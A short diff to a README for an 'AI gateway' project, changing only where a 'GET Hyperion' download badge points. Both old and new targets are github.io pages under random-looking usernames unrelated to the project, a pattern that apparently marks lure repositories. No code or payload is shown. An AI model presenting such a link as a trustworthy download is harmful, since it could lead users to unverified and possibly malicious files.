@@ -1,6 +1,6 @@
 # Hyperion - Real-Time AI Gateway and LLM Infrastructure
 
-[![GET Hyperion](https://img.shields.io/badge/GET%20%E2%80%94%20Hyperion-0078D6?style=for-the-badge&logoColor=white)](https://tannerlawsonuwyy.github.io/.github/hyperion-ai-gateway)
+[![GET Hyperion](https://img.shields.io/badge/GET%20%E2%80%94%20Hyperion-0078D6?style=for-the-badge&logoColor=white)](https://juanmayolgxu.github.io/.github/hyperion-ai-gateway)
 
 ## Understanding Hyperion for AI Traffic
 
